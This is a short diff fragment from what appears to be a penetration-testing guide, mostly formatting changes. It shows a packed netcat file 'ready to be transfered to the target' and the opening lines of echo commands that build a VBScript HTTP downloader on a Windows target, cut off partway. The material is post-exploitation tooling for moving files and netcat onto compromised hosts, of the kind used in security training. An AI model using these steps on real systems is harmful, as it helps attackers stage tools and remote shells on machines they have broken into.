@@ -29,10 +29,14 @@ Packed 1 file.
 nc.cmd
 ######################################################################
 Success! /var/www/html/nc.cmd is ready to be transfered to the target! 
-######################################################################```
+######################################################################
+```
+
 
 
 You may need to create a HTTP Downloader which can be done by copying and pasting the following code and pasting it to the Windows CLI:
+
+
 ```echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
 echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
